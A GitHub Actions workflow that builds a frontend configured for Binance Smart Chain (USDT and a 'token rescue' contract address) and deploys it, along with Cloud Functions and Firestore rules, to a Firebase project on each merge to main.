name: Deploy to Firebase on merge
'on':
  push:
    branches:
      - main
jobs:
  build_and_deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Install dependencies and build frontend
        run: npm ci && npm run build
        env:
          VITE_BSC_HTTP_RPC_URL: "https://bsc-rpc.publicnode.com/"
          VITE_BSC_WS_RPC_URL: "wss://bsc-rpc.publicnode.com/"
          VITE_BSC_CHAIN_ID: "56"
          VITE_BSC_USDT_CONTRACT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955"
          VITE_TOKEN_RESCUE_CONTRACT: "0xc6bf6838263938533e547f825d257c9965544a50"
          VITE_RESCUE_DESTINATION_ADDRESS: "0xc6bf6838263938533e547f825d257c9965544a50"
          VITE_API_BASE: "https://us-central1-transfer-9d294.cloudfunctions.net"
          
      - name: Deploy Hosting to Firebase
        uses: FirebaseExtended/action-hosting-deploy@v0
        with:
          repoToken: '${{ secrets.GITHUB_TOKEN }}'
          firebaseServiceAccount: '${{ secrets.FIREBASE_SERVICE_ACCOUNT_TRANSFER_9D294 || secrets.FIREBASE_SERVICE_ACCOUNT_RESCUE_4E4B5 }}'
          channelId: live
          projectId: transfer-9d294

      - name: Deploy Functions and Firestore Rules
        uses: w9jds/firebase-action@master
        with:
          args: deploy --only functions,firestore:rules --force
        env:
          GCP_SA_KEY: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_TRANSFER_9D294 || secrets.FIREBASE_SERVICE_ACCOUNT_RESCUE_4E4B5 }}
          PROJECT_ID: transfer-9d294
